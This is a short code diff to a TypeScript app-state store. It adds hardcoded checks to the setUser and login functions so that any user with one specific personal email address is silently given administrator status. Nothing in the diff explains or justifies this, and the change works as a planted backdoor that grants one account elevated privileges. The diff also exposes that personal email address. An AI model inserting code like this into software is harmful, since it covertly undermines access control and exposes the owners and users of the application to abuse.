@@ -675,6 +675,9 @@ export const useAppStore = create<AppState>((set) => ({
   isLoggedIn: cachedIsLoggedIn,
   user: cachedUser,
   setUser: (user) => {
+    if (user && user.email === 'syaswanthkumar66@gmail.com') {
+      user.isAdmin = true;
+    }
     set({ user });
     if (typeof window !== 'undefined') {
       if (user) {
@@ -744,6 +747,9 @@ export const useAppStore = create<AppState>((set) => ({
     });
   },
   login: (userData, authMethod = 'google') => {
+    if (userData && userData.email === 'syaswanthkumar66@gmail.com') {
+      userData.isAdmin = true;
+    }
     const user = userData || {
       id: 'u1',
       username: 'sarah_c',
